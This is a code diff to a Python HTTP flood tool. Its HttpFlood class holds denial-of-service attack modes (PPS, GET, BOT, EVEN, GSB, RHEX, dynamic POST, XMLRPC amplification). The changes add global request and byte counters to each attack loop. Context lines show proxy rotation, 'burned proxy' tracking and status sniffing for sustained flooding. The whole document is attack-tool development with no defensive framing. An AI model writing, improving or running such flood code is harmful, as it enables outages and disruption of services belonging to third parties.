@@ -1311,12 +1311,14 @@ class HttpFlood(Thread):
 
     def PPS(self) -> None:
         # [OPTIMIZED] Parsed Packet Storm (Dynamic)
-        # Replaces simple payload with dynamic generation
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                # Use Global Dynamic Generator
-                Tools.send(s, self.generate_payload())
+                payload = self.generate_payload()
+                if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -1326,9 +1328,12 @@ class HttpFlood(Thread):
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
         Tools.safe_close(s)
 
     def BOT(self) -> None:
@@ -1351,18 +1356,28 @@ class HttpFlood(Thread):
                                           ProxyTools.Random.rand_str(4)) +
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1)
-            Tools.send(s, p2)
+            if Tools.send(s, p1):
+                REQUESTS_SENT += 1
+                BYTES_SEND += len(p1)
+            if Tools.send(s, p2):
+                REQUESTS_SENT += 1
+                BYTES_SEND += len(p2)
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
         Tools.safe_close(s)
 
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
             while Tools.send(s, payload) and s.recv(1):
+                REQUESTS_SENT += 1
+                BYTES_SEND += len(payload)
                 continue
         Tools.safe_close(s)
 
@@ -1461,11 +1476,13 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
-            global CONNECTIONS_SENT
+            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
                     # [NEW] Status Tracker (Sniffer) + Auto Reconnect + Blacklist
                     try:
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
@@ -1507,11 +1524,13 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
-            global CONNECTIONS_SENT, BURNED_PROXIES
+            global CONNECTIONS_SENT, BURNED_PROXIES, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Non-Cacheable Packet Sent")
             for _ in range(self._rpc):
                 if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
                     # Status Sniffer
                     try:
                         response_start = s.recv(20).decode('utf-8', errors='ignore')
@@ -1633,6 +1652,7 @@ class HttpFlood(Thread):
 
     def GSB(self):
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
@@ -1651,7 +1671,9 @@ class HttpFlood(Thread):
                              'Sec-Gpc: 1\r\n'
                              'Pragma: no-cache\r\n'
                              'Upgrade-Insecure-Requests: 1\r\n\r\n')
-                Tools.send(s, payload)
+                if Tools.send(s, payload):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(payload)
         Tools.safe_close(s)
 
     def RHEX(self):
@@ -1711,10 +1733,15 @@ class HttpFlood(Thread):
             "Host: %s\r\n" % hexh +
             self.randHeadercontent + dep)
         s = None
+        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1)
+            if Tools.send(s, p1):
+                REQUESTS_SENT += 1
+                BYTES_SEND += len(p1)
             for _ in range(self._rpc):
-                Tools.send(s, p2)
+                if Tools.send(s, p2):
+                    REQUESTS_SENT += 1
+                    BYTES_SEND += len(p2)
         Tools.safe_close(s)
 
     def NULL(self) -> None:
@@ -1929,7 +1956,7 @@ class HttpFlood(Thread):
         try:
             s = self.open_connection()
             # Increment Global Counter
-            global CONNECTIONS_SENT
+            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
             CONNECTIONS_SENT += 1
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] XMLRPC: Amplification Packet Sent to {self._target.authority}")
             
